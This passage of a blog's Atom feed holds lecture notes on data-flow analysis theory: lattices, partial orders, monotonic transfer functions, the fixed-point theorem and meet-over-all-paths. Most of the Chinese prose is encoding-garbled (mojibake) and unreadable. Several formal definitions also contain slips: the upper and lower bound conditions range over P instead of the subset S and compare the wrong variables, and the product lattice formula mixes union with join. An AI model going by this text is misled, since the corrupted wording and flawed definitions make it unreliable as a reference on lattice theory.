title="å¯¹äºæ•°æ®æµåˆ†æè§£é‡Šä¸‰çš„ç†è§£"></a>å¯¹äºæ•°æ®æµåˆ†æè§£é‡Šä¸‰çš„ç†è§£</h1><p>æ•°æ®æµçš„transferå’Œcontrol-flow handingå®šä¹‰äº†ä¸€ç»„æ–¹ç¨‹ï¼š</p><ul><li>$\mathrm{D}_{\mathrm{v}_{1}}=\mathrm{F}_{\mathrm{v}_{1}}\left(\mathrm{D}_{\mathrm{v}_{1}}, \mathrm{D}_{\mathrm{v}_{2}}, \ldots, \mathrm{D}_{\mathrm{v}_{\mathrm{n}}}\right)$</li><li>$\mathrm{D}_{\mathrm{v}_{2}}=\mathrm{F}_{\mathrm{v}_{2}}\left(\mathrm{D}_{\mathrm{v}_{1}}, \mathrm{D}_{\mathrm{v}_{2}}, \ldots, \mathrm{D}_{\mathrm{v}_{\mathrm{n}}}\right)$</li><li>â€¦</li><li>$D_{v_{n}}=F_{v_{n}}\left(D_{v_{1}}, D_{v_{2}}, \ldots, D_{v_{n}}\right)$</li></ul><p>å…¶ä¸­ï¼š</p><ul><li>$F_{v_{1}}\left(\mathrm{D}_{\mathrm{v}_{1}}, \mathrm{D}_{\mathrm{v}_{2}}, \ldots, \mathrm{D}_{\mathrm{v}_{\mathrm{n}}}\right)=f_{v_{1}}(I)$</li><li>$F_{v_{i}}\left(\mathrm{D}_{\mathrm{v}_{1}}, \mathrm{D}_{\mathrm{v}_{2}}, \ldots, \mathrm{D}_{\mathrm{v}_{\mathrm{n}}}\right)=f_{v_{i}}\left(\sqcap_{j \in \operatorname{pred}(i)} D_{v_{j}}\right)$</li></ul><p>æ•°æ®æµåˆ†æå³ä½¿æ±‚è¯¥æ–¹ç¨‹çš„æœ€å¤§è§£ï¼ˆUnificationç®—æ³•ï¼‰ï¼Œå¯¹äºå•è°ƒå‡½æ•°å’Œæœ‰é™æ ¼ï¼ŒUnificationç®—æ³•å°±æ˜¯ä¸Šè¿°çš„ä¸åŠ¨ç‚¹ç®—æ³•ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Overview-amp-Preliminaries&quot;&gt;&lt;a href=&quot;#Overview-amp-Preliminaries&quot; class=&quot;headerlink&quot; title=&quot;Overview &amp;amp;  Preliminaries&quot;&gt;&lt;/a&gt;Overview &amp;amp;  Preliminaries&lt;/h1&gt;&lt;p&gt;ä¸¤ç±»åˆ†æï¼š&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;may Analysisï¼šover-approximation&lt;/li&gt;
&lt;li&gt;must Analysisï¼šunder-approximation&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;å®é™…ä¸Šéƒ½æ˜¯ä¸ºäº†safety of analysisã€‚&lt;/p&gt;&lt;h2 id=&quot;å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š&quot;&gt;&lt;a href=&quot;#å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š&quot; class=&quot;headerlink&quot; title=&quot;å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š&quot;&gt;&lt;/a&gt;å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š&lt;/h2&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ•°æ®æµåˆ†æ" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
      <category term="PL" scheme="http://anemone.top/tags/PL/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90-%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/</id>
    <published>2020-08-02T09:34:13.000Z</published>
    <updated>2020-10-18T04:04:24.629Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Iterative-Algorithm"><a href="#Iterative-Algorithm" class="headerlink" title="Iterative Algorithm"></a>Iterative Algorithm</h1><ul><li><p>å¯¹äºä¸€ä¸ªå« $k$ ä¸ªèŠ‚ç‚¹çš„CFGï¼Œæ¯ä¸ªè¿­ä»£ç®—æ³•å¯¹äºæ¯ä¸ªnode $n$ æ›´æ–°$\mathrm{OUT}[n]$ã€‚</p></li><li><p>å‡è®¾è¿­ä»£ç®—æ³•çš„ç ”ç©¶å¯¹è±¡ï¼ˆdomainï¼‰æ˜¯$V$ï¼Œå®šä¹‰ä¸€ä¸ªkå…ƒç»„<br>  <script type="math/tex">V^k=\left(\mathrm{OUT}\left[\mathrm{n}_{1}\right], \mathrm{OUT}\left[\mathrm{n}_{2}\right], \ldots, \mathrm{OUT}\left[\mathrm{n}_{\mathrm{k}}\right]\right)$ï¼Œ$V^k\in(V_1 \times V_2 \times \dots \times V_k)</script>ï¼Œ<br>  $ V^k $ å³ä¸€æ¬¡è¿­ä»£äº§ç”Ÿçš„è¾“å‡ºï¼Œæ¯æ¬¡è¿­ä»£ä¼šæ›´æ–°$V^k$ï¼Œå¯ä»¥å°†æ¯æ¬¡è¿­ä»£ç»è¿‡transfer functionså’Œcontrol-flow handingçš„è¿‡ç¨‹æŠ½è±¡ä¸º$F: V^k\rightarrow {V^{k}}â€™$</p></li><li><p>å½“$V^k\rightarrow {V^{k}}â€™$æ—¶ï¼Œå³$X=F(X)$ ï¼Œç§°$F(x)$åœ¨$X$å¤„åˆ°è¾¾äº†<strong>ä¸åŠ¨ç‚¹</strong>ï¼Œ$X$ä¸º$F(x)$çš„ä¸åŠ¨ç‚¹ï¼Œ</p></li></ul><a id="more"></a><h1 id="Poset-amp-partial-orderï¼ˆååºé›†å’Œååºï¼‰"><a href="#Poset-amp-partial-orderï¼ˆååºé›†å’Œååºï¼‰" class="headerlink" title="Poset &amp; partial orderï¼ˆååºé›†å’Œååºï¼‰"></a>Poset &amp; partial orderï¼ˆååºé›†å’Œååºï¼‰</h1><blockquote><p>We define <strong>poset</strong> as a pair (P, âŠ‘) where âŠ‘ is a binary relation that defines a partial ordering over P, and âŠ‘ has the following properties: </p><p>(1) $\forall x \in P, x \sqsubseteq x$  (Reflexivity, è‡ªåæ€§)<br>(2) $\forall x, y \in P, x \sqsubseteq y \wedge y \sqsubseteq x \Rightarrow x=y \quad$ (Antisymmetryï¼Œåå¯¹ç§°æ€§)<br>(3) $\forall x,y,z \in P, x \sqsubseteq y \wedge y \sqsubseteq z \Rightarrow x \sqsubseteq z $ (Transitivityï¼Œä¼ é€’æ€§)</p></blockquote><p><strong>ååºé›†</strong>ä¸ºä¸€ä¸ªäºŒå…ƒç»„$(P, \sqsubseteq)$ï¼Œ$P$ä¸ºä¸€é›†åˆï¼Œ$\sqsubseteq$ä¸ºåœ¨é›†åˆä¸Šçš„ä¸€ç§æ¯”è¾ƒå…³ç³»ï¼Œè¿™ä¸ªäºŒå…ƒç»„ä¸ºååºé›†å½“ä¸”ä»…å½“é›†åˆå…ƒç´ åœ¨å…³ç³»ä¸Šæ»¡è¶³è‡ªåæ€§ã€åå¯¹ç§°æ€§å’Œä¼ é€’æ€§ã€‚</p><p><strong>ååº</strong>çš„å«ä¹‰ï¼šä¸€ä¸ªé›†åˆä¸­çš„ä»»æ„ä¸¤ä¸ªå…ƒç´ ä¸ä¸€å®šå­˜åœ¨é¡ºåºå…³ç³»ï¼ˆä»»æ„ä¸¤å…ƒç´ ä¸ä¸€å®šèƒ½æ¯”è¾ƒå¤§å°ï¼‰</p><h1 id="Uppper-and-Lower-Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰"><a href="#Uppper-and-Lower-Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰" class="headerlink" title="Uppper and Lower Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰"></a>Uppper and Lower Boundsï¼ˆä¸Šç•Œå’Œä¸‹ç•Œï¼‰</h1><blockquote><p>Given a poset (P, âŠ‘) and its subset $S$ that  $S\subseteq P$, we say that $u\in P$ is an <strong>upper bound</strong> of $S$, if $\forall x \in P, x\sqsubseteq u$. Similarly, $lâˆˆP$ is an <strong>lower bound</strong> of $S$, if $\forall x \in P, l\sqsubseteq u$.</p></blockquote><p>å¦‚å›¾ï¼Œ$\{a,b,c\}$æ˜¯$S$çš„ä¸Šç•Œï¼ˆç°è‰²ï¼‰ï¼Œ$\{\}$æ˜¯$S$çš„ä¸‹ç•Œï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200804204606009.png" alt="image-20200804204606009"></p><h2 id="æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ"><a href="#æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ" class="headerlink" title="æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ"></a>æœ€å°ä¸Šç•Œã€æœ€å¤§ä¸‹ç•Œ</h2><blockquote><p>We define the <strong>least upper bound (lub or join)</strong> of $S$, written $âŠ”S$, if for every upper bound of $S$, say $u, âŠ”SâŠ‘u$. Similarly, We define the <strong>greatest lower bound (glb or meet)</strong> of $S$, written $âŠ“S$, if for every lower bound of $S$, say $l, lâŠ‘âŠ“S$.</p></blockquote><p>ç‰¹åˆ«çš„ï¼Œå¯¹äºä»…æœ‰ä¸¤ä¸ªå…ƒç´ çš„é›†åˆ$S=\{a,b\}$ï¼Œ$\sqcup S$ å¯ä»¥å†™ä¸º$a \sqcup b$ï¼ŒåŒç† $\sqcap S$å¯ä»¥å†™ä¸º $a\sqcap b$ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>ï¼ˆæœ€å°ï¼‰ä¸Šç•Œå’Œï¼ˆæœ€å¤§ï¼‰ä¸‹ç•Œæ˜¯é’ˆå¯¹é›†åˆä¸­çš„ç‰¹å®šå­é›†çš„ï¼Œè€Œä¸Šä¸‹ç•Œæœ¬èº«ä¸ä¸€å®šåœ¨å­é›†ä¸­ï¼Œå¹¶ä¸”ï¼š</p><ul><li>ä¸æ˜¯æ‰€æœ‰ååºé›†å‡å­˜åœ¨lubæˆ–è€…glbï¼ˆå¦‚å…ˆå‰ç°è‰²çš„é›†åˆå°±ä¸å«lubï¼‰</li><li>å¦‚æœä¸€ä¸ªååºé›†å­˜åœ¨lubå’Œglbï¼Œé‚£ä¹ˆå®ƒæ˜¯å”¯ä¸€çš„<ul><li>è¯æ˜ï¼š è®¾$g_1$ å’Œ$g_2$ åŒä¸º P çš„glbï¼Œé‚£ä¹ˆæ ¹æ®å®šä¹‰ $g_1\sqsubseteq (g_2 = \sqcap P)$ å¹¶ä¸”$g_2\sqsubseteq (g_1 = \sqcap P)$ï¼Œåˆå› ä¸ºåå¯¹ç§°æ€§ï¼Œæ‰€ä»¥$g_1=g_2$</li></ul></li></ul><h1 id="Lattice-Semilattice-Complete-and-Product-Lattice"><a href="#Lattice-Semilattice-Complete-and-Product-Lattice" class="headerlink" title="Lattice, Semilattice, Complete and Product Lattice"></a>Lattice, Semilattice, Complete and Product Lattice</h1><h2 id="Latticeï¼ˆæ ¼ï¼‰"><a href="#Latticeï¼ˆæ ¼ï¼‰" class="headerlink" title="Latticeï¼ˆæ ¼ï¼‰"></a>Latticeï¼ˆæ ¼ï¼‰</h2><blockquote><p>Given a poset $(P, âŠ‘), âˆ€a,bâˆˆP$, if $aâŠ”b$ and $aâŠ“b$ exist, then $(P,âŠ‘)$ is called a lattice. </p></blockquote><p>å¦‚æœä¸€ä¸ªååºé›†çš„ä»»æ„ä¸¤ä¸ªå…ƒç´ éƒ½æœ‰æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œï¼Œé‚£ä¹ˆè¿™ä¸€ååºé›†æ˜¯ä¸€ä¸ª<strong>æ ¼</strong></p><h2 id="Semilattice"><a href="#Semilattice" class="headerlink" title="Semilattice"></a>Semilattice</h2><p>æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œåªå­˜åœ¨ä¸€ä¸ªçš„ååºé›†ç§°<strong>åŠæ ¼</strong>ï¼Œåªå­˜åœ¨æœ€å°ä¸Šç•Œç§°ä¸ºâ€œjoin semilatticeâ€ï¼Œåªå­˜åœ¨æœ€å¤§ä¸‹ç•Œç§°ä¸ºâ€œmeet semilatticeâ€ã€‚</p><h2 id="Complete-Latticeï¼Œtop-amp-bottomï¼ˆå…¨æ ¼ï¼Œ-top-å’Œ-perp-ï¼‰"><a href="#Complete-Latticeï¼Œtop-amp-bottomï¼ˆå…¨æ ¼ï¼Œ-top-å’Œ-perp-ï¼‰" class="headerlink" title="Complete Latticeï¼Œtop &amp; bottomï¼ˆå…¨æ ¼ï¼Œ$\top$ å’Œ $\perp$ï¼‰*"></a>Complete Latticeï¼Œtop &amp; bottomï¼ˆå…¨æ ¼ï¼Œ$\top$ å’Œ $\perp$ï¼‰*</h2><blockquote><p>Given a lattice $(P,âŠ‘)$, for arbitrary subset $S$ of $P$, if $âŠ”S$ and $âŠ“S$ exist, then $(P,âŠ‘)$ is called a complete lattice.</p></blockquote><p>ä¸€ä¸ªååºé›†çš„ä»»æ„å­é›†å‡å­˜åœ¨æœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œï¼Œé‚£ä¹ˆè¿™ä¸ªååºé›†æˆä¸º<strong>å…¨æ ¼</strong>ã€‚</p><p>æ¯ä¸ªå…¨æ ¼éƒ½å­˜åœ¨ä¸€ä¸ªæœ€å¤§å…ƒç´  topï¼ˆ$\top=\sqcup P$ï¼‰å’Œæœ€å°å…ƒç´ bottomï¼ˆ$\perp=\sqcap P$ï¼‰</p><p>æ‰€æœ‰å…ƒç´ æœ‰é™çš„æ ¼ï¼ˆfinite latticeï¼‰å‡æ˜¯å…¨æ ¼ã€‚ï¼ˆåä¹‹ä¸æˆç«‹ï¼‰</p><h2 id="Product-Lattice"><a href="#Product-Lattice" class="headerlink" title="Product Lattice"></a>Product Lattice</h2><blockquote><p>Given lattices $L_1=(P_1,âŠ‘_1),L_2=(P_2,âŠ‘_2),â€¦,L_n=(P_n,âŠ‘)n)$, if for all $i$, $(P_i,âŠ‘_i)$ has $âŠ”i$(least upper bound) and $âŠ“_i$(greatest lower bound), then we can have a product lattice $L^n=(P,âŠ‘)$ that is defined by:</p><ul><li>$P=P_{1} \times \ldots \times P_{n}$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqsubseteq\left(y_{1}, \ldots, y_{n}\right) \Leftrightarrow\left(x_{1} \sqsubseteq y_{1}\right) \wedge \ldots \wedge\left(x_{n} \sqsubseteq y_{n}\right)$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqcup\left(y_{1}, \ldots, y_{n}\right)=\left(x_{1} \sqcup_{1} y_{1}, \ldots, x_{n} \cup_{n} y_{n}\right)$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqcap\left(y_{1}, \ldots, y_{n}\right)=\left(x_{1} \sqcap_{1} y_{1}, \ldots, x_{n} \sqcap_{n} y_{n}\right)$</li></ul></blockquote><p>Product Latticeä»æ˜¯Latticeï¼Œè‹¥æ¯ä¸ªå­æ ¼ä¸ºå…¨æ ¼ï¼Œé‚£ä¹ˆä¹˜ç§¯ä¹Ÿæ˜¯å…¨æ ¼ã€‚</p><h1 id="Data-Flow-Analysis-Framework-via-Lattice"><a href="#Data-Flow-Analysis-Framework-via-Lattice" class="headerlink" title="Data Flow Analysis Framework via Lattice"></a>Data Flow Analysis Framework via Lattice</h1><p>ä¸€ä¸ªæ•°æ®æµåˆ†ææ¡†æ¶å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªä¸‰å…ƒç»„$(D,L,F)$ ï¼Œå…¶ä¸­ï¼š</p><ul><li>Dï¼šæŒ‡æ•°æ®æµåˆ†æçš„æ–¹å‘ï¼Œi.e., forward or backwardï¼›</li><li>Lï¼šæŒ‡latticeï¼Œè¯¥æ ¼è¡¨ç¤ºæ‰€æœ‰domainå€¼åŸŸï¼Œä»¥åŠmeetï¼ˆ$\sqcap$ï¼‰æˆ–joinï¼ˆ$\sqcup$ï¼‰æ“ä½œï¼›</li><li>Fï¼šä¸€ç»„transfer functionã€‚</li></ul><h1 id="Monotonicity-and-Fixed-Point-Theorem"><a href="#Monotonicity-and-Fixed-Point-Theorem" class="headerlink" title="Monotonicity and Fixed Point Theorem"></a>Monotonicity and Fixed Point Theorem</h1><h2 id="Monotonicityï¼ˆå•è°ƒæ€§ï¼‰"><a href="#Monotonicityï¼ˆå•è°ƒæ€§ï¼‰" class="headerlink" title="Monotonicityï¼ˆå•è°ƒæ€§ï¼‰"></a>Monotonicityï¼ˆå•è°ƒæ€§ï¼‰</h2><blockquote><p>A function $f: Lâ†’L$ ($L$ is a lattice) is monotonic if $âˆ€x,yâˆˆL$,  $xâŠ‘yâŸ¹f(x)âŠ‘f(y)$</p></blockquote><p>æ™®é€šå‡½æ•°çš„å•è°ƒæ€§çš„æ¨å¹¿</p><h2 id="Fixed-Point-Theorem"><a href="#Fixed-Point-Theorem" class="headerlink" title="Fixed-Point Theorem"></a>Fixed-Point Theorem</h2><blockquote><p>Given a complete lattice ($L,âŠ‘$), if (1) $f:Lâ†’L$ is monotonic and (2) $L$ is finite, then the <strong>least fixed point</strong> of $f$ can be found by iterating $f(âŠ¥), f(f(âŠ¥)), \dots, f^k(âŠ¥)$ until a fixed point is reached the greatest fixed point of $f$ can be found by iterating $f(\top),f(f(\top)),\dots, f^k(\top)$ until a fixed point is reached.</p></blockquote><p>å¦‚æœfå•è°ƒä¸”Læœ‰ç•Œï¼Œé‚£ä¹ˆfå­˜åœ¨ä¸åŠ¨ç‚¹ï¼Œä»$âŠ¥$å¼€å§‹è¿­ä»£æ‰§è¡Œ$f$å¯å¾—æœ€å°ä¸åŠ¨ç‚¹ï¼Œä»$\top$å¼€å§‹è¿­ä»£å¯å¾—æœ€å¤§ä¸åŠ¨ç‚¹ã€‚</p><p>è¯æ˜ï¼š<br>(1) Existence<br>ç”±$\perp$å®šä¹‰ä»¥åŠ$f:L\rightarrow L$å¯å¾—</p><script type="math/tex; mode=display">\perp \sqsubseteq f(\perp)</script><p>åˆå› $f$æ˜¯å•è°ƒçš„ï¼Œå› æ­¤</p><script type="math/tex; mode=display">f(\perp) \sqsubseteq f(f(\perp))=f^2(\perp)</script><p>ç”±äºLæ˜¯æœ‰é™(finite)çš„ï¼Œå› æ­¤æ€»ä¼šå­˜åœ¨ä¸€ä¸ªkï¼Œæœ‰</p><script type="math/tex; mode=display">f^{Fix}=f^k(\perp)=f^{k+1}(\perp)</script><p>ï¼ˆ2ï¼‰Least Fixed Pointï¼ˆæ•°å½’æ³•ï¼Œè¯æ˜æœ€å°ï¼‰</p><p>å‡è®¾æˆ‘ä»¬æœ‰å¦ä¸€ä¸ªä¸åŠ¨ç‚¹xï¼Œi.e., $x=f(x)$</p><p>ç”±$\perp$çš„å®šä¹‰ï¼Œæˆ‘ä»¬æœ‰$\perp \sqsubseteq x$;</p><p>ä¸‹é¢ç”¨æ•°å½’æ³•è¯æ˜ï¼š</p><p>ç”±äº $f$ æ˜¯å•è°ƒçš„ï¼Œå› æ­¤</p><script type="math/tex; mode=display">f(\perp) \sqsubseteq f(x)</script><p>å¯¹äº$f^i(\perp)\sqsubseteq f^i(x)$ï¼Œç”±äº $f$ æ˜¯å•è°ƒçš„ï¼Œå› æ­¤æœ‰</p><script type="math/tex; mode=display">f^{i+1}(\perp)\sqsubseteq f^{i+1}(x)</script><p>å› æ­¤å¯¹äºä»»æ„iï¼Œæœ‰</p><script type="math/tex; mode=display">f^i(\perp)\sqsubseteq f^i(x)</script><p>åˆå› ä¸º$x=f(x)$ï¼Œæ‰€ä»¥å­˜åœ¨ä¸€ä¸ªiï¼Œæœ‰$f^i(\perp)\sqsubseteq f^i(x)=x$ï¼Œå› æ­¤æœ‰</p><script type="math/tex; mode=display">f^{Fix} = f^k(\perp) \sqsubseteq x</script><p>å› æ­¤$f^i(\perp)$ æ˜¯æœ€å°ä¸åŠ¨ç‚¹ã€‚</p><h1 id="Relate-lterative-Algorithm-to-Fixed-Point-Theorem"><a href="#Relate-lterative-Algorithm-to-Fixed-Point-Theorem" class="headerlink" title="Relate lterative Algorithm to Fixed Point Theorem"></a>Relate lterative Algorithm to Fixed Point Theorem</h1><p>å¦‚ä½•å°†è¿­ä»£ç®—æ³•å’Œä¸åŠ¨ç‚¹å®šç†è”ç³»èµ·æ¥ï¼Ÿ</p><ol><li>ç¨‹åºä¸­æ¯ä¸€ä¸ªçŠ¶æ€ä¸ºä¸€ä¸ªproduct lattice</li><li>Transfer functionå’Œjoin/meet fucntionå¯ä»¥è§†ä¸ºF</li></ol><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200812205336289.png" alt="image-20200812205336289"></p><p>ä¸‹é¢åªéœ€è¦è¯æ˜Transfer functionå’Œ join/meet functionå‡ä¸ºå•è°ƒçš„å³å¯</p><ol><li><p>Transfer functionæ˜¯å•è°ƒçš„ï¼Œå› ä¸ºé€šè¿‡ä¹‹å‰åˆ†æï¼Œæ‰€æœ‰Gen/Killçš„å‡½æ•°éƒ½æ˜¯å•è°ƒçš„ï¼›</p></li><li><p>Join/meet functionæ˜¯å•è°ƒçš„ï¼Œè¯æ˜å¦‚ä¸‹</p><p>è¦è¯Join/meet functionï¼Œå°±æ˜¯è¦è¯$\forall x, y, z \in L, x \sqsubseteq y \Rightarrow x\sqcup z \sqsubseteq y \sqcup z$</p><p>ç”± $\sqcup$ å®šä¹‰å¯å¾—ï¼Œ$y \sqsubseteq y \sqcup z$ï¼Œ</p><p>ç”±äº$\sqsubseteq$ä¼ é€’æ€§ï¼Œ$x \sqsubseteq y$ï¼Œå› æ­¤$x \sqsubseteq y \sqcup z$ï¼Œå› æ­¤ $y \sqcup z$ æ˜¯ $x$ çš„ä¸Šç•Œï¼Œ</p><p>æ³¨æ„åˆ° $y \sqcup z$ ä¹Ÿæ˜¯ $z$ çš„ä¸Šç•Œï¼Œè€Œ$x\sqcup z$ æ˜¯ $x$ å’Œ $z$ çš„æœ€å°ä¸Šç•Œï¼Œ</p><p>å› æ­¤ $ x \sqsubseteq y \Rightarrow x\sqcup z \sqsubseteq y \sqcup z$</p></li></ol><p><strong>è®¨è®ºç®—æ³•å¤æ‚åº¦</strong></p><p>å®šä¹‰æ ¼çš„é«˜åº¦å³ä»topè‡³bottomçš„æœ€é•¿è·¯å¾„é•¿ï¼Œ</p><blockquote><p>The height of a lattice $h$ is the length of the longest path from Top to Bottom in the lattice.</p></blockquote><p>æœ€åæƒ…å†µå³ä¸€æ¬¡è¿­ä»£ï¼Œåªå˜åŒ–ä¸€ä¸ªå•ä½é«˜åº¦ï¼Œå› æ­¤å¤æ‚åº¦ä¸º$O(h \times k)$.</p><h1 id="May-Must-Analysis-A-Lattice-View"><a href="#May-Must-Analysis-A-Lattice-View" class="headerlink" title="May/Must Analysis, A Lattice View*"></a>May/Must Analysis, A Lattice View*</h1><p>ä»»ä½•åˆ†æåˆå§‹çŠ¶æ€éƒ½ä»unsafeè‡³safeã€‚</p><p>ä¸ªäººå¯¹safeå’Œunsafeçš„ç†è§£ï¼šé’ˆå¯¹äºåˆ†æç»“æœè€Œè¨€ï¼Œå¤„ç†æ‰€æœ‰åˆ†æç»“æœåï¼Œç¨‹åºè¡Œä¸ºæ­£å¸¸ä¸ºsafeï¼Œåä¹‹ä¸ºunsafeï¼Œæç«¯çš„safeæ˜¯æ— ç”¨çš„ï¼ˆå¦‚å®‰å…¨æ‰«æä¸­çš„æ¨¡å¼åŒ¹é…ï¼‰<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200812214731510.png" alt="image-20200812214731510"></p><p>Mustå’ŒMayåˆ†æçš„ç¤ºæ„å›¾å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¯¹äºMuståˆ†æï¼Œæ¯ä¸ªä»£ç å—éƒ½æ˜¯ä» $\top$ å¼€å§‹çš„ï¼Œå› ä¸ºåœ¨ç¨‹åºä¸€å¼€å§‹ï¼Œç®—æ³•è®¤ä¸ºæ‰€æœ‰çš„å¾…åˆ†æå¯¹è±¡éƒ½æ˜¯â€œåˆæ ¼â€çš„ï¼ˆä¾‹å¦‚å­˜æ´»è¡¨è¾¾å¼åˆ†æä¸­ï¼Œç®—æ³•è®¤ä¸ºæ¯ä¸ªè¡¨è¾¾å¼éƒ½æ˜¯æˆæ´»çš„ï¼‰â€”â€”è¿™æ˜¯ä¸€ä¸ªä¸å®‰å…¨çš„çŠ¶æ€ï¼Œç»è¿‡ä¸æ–­è¿­ä»£ï¼Œç®—æ³•é€æ¸ä¸‹é™åˆ°æœ€å¤§ä¸åŠ¨ç‚¹ï¼Œè™½ç„¶å·²ç»è¿‡äº†truthç‚¹ï¼ˆæ¼æŠ¥ï¼‰ï¼Œä½†æ˜¯è¿™å·²ç»æ˜¯æœ€å¥½æƒ…å†µäº†ï¼ˆè¶Šå¾€ä¸‹èµ°è¶Šsafeä½†æ˜¯ç»“æœä¹Ÿæ²¡æ„ä¹‰äº†ï¼‰ï¼Œå¯¹è¿™äº›ç»“æœåšä¼˜åŒ–èƒ½ç¡®ä¿ç¨‹åºä¸å‡ºé”™ï¼ˆsafeï¼‰ã€‚</p><p>å¯¹äºMayåˆ†æï¼Œæ¯ä¸ªä»£ç å—ä» $\perp$ å¼€å§‹ï¼Œå³åœ¨ä¸€å¼€å§‹ï¼Œç®—æ³•è®¤ä¸ºæ‰€æœ‰åˆ†æå¯¹è±¡éƒ½æ˜¯ä¸åˆæ ¼çš„ï¼ˆä¾‹å¦‚å®šä¹‰å¯è¾¾æ€§åˆ†æä¸­ï¼Œç®—æ³•è®¤ä¸ºæ¯ä¸€æ¡å®šä¹‰éƒ½æ²¡æœ‰æ–°çš„å®šä¹‰ï¼‰â€”â€”è¿™æ˜¯Mayç±»å‹çš„ä¸å®‰å…¨çŠ¶æ€ï¼Œç»è¿‡ä¸æ–­è¿­ä»£ï¼Œç®—æ³•é€æ¸ä¸Šå‡åˆ°æœ€å°ä¸åŠ¨ç‚¹ï¼ŒåŒæ ·ä¹Ÿè¿‡äº†truthï¼ˆè¯¯æŠ¥ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯åˆ†æçš„æœ€å¥½æƒ…å†µï¼Œç®—æ³•ä¾æ—§åœç•™åœ¨safeåŒºåŸŸã€‚</p><h1 id="Distributivityï¼ˆåˆ†é…æ€§ï¼‰-and-MOP"><a href="#Distributivityï¼ˆåˆ†é…æ€§ï¼‰-and-MOP" class="headerlink" title="Distributivityï¼ˆåˆ†é…æ€§ï¼‰ and MOP"></a>Distributivityï¼ˆåˆ†é…æ€§ï¼‰ and MOP</h1><h2 id="MOPï¼ˆMeet-Over-All-Paths-Solutionï¼‰"><a href="#MOPï¼ˆMeet-Over-All-Paths-Solutionï¼‰" class="headerlink" title="MOPï¼ˆMeet-Over-All-Paths Solutionï¼‰"></a>MOPï¼ˆMeet-Over-All-Paths Solutionï¼‰</h2><p>è®¾ $s_x$ ä¸ºæ¯ä¸€ä¸ªstatmentsï¼Œè®¾ $F_p$ æ˜¯ä¸€ä¸ªè·¯å¾„ $P$ ä¸Šçš„ transfer functionï¼Œé‚£ä¹ˆ$MOP[S_i]=\sqcup/\sqcap_{\text{A path }P\text{ from Entry to }S_{i}} F_p(OUT[Entry])$.</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200814215920162.png" alt="image-20200814215920162"></p><p>å°±æ˜¯è¯´ï¼Œä¹‹å‰æ•°æ®æµåˆ†æçš„ç»“æœæ˜¯<strong>æµæ•æ„Ÿ</strong>çš„ï¼Œè€Œ MOP çš„ç»“æœæ˜¯è·¯å¾„æ•æ„Ÿçš„ï¼Œ</p><p>ä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºçš„æ•°æ®æµï¼Œæ•°æ®æµåˆ†æçš„ç»“æœæ˜¯ $\mathrm{IN}\left[\mathrm{s}_{4}\right]=f_{s_{3}}\left(f_{s_{1}}(\mathrm{OUT}[ entry ]) \sqcup f_{S_{2}}( OUT [ Entry ])\right)$ï¼Œè€ŒMOPæ˜¯ $ \mathrm{MOP}\left[\mathrm{s}_{4}\right]=f_{S_{3}}\left(f_{s_{1}}(\mathrm{OUT}[ entry ])\right) 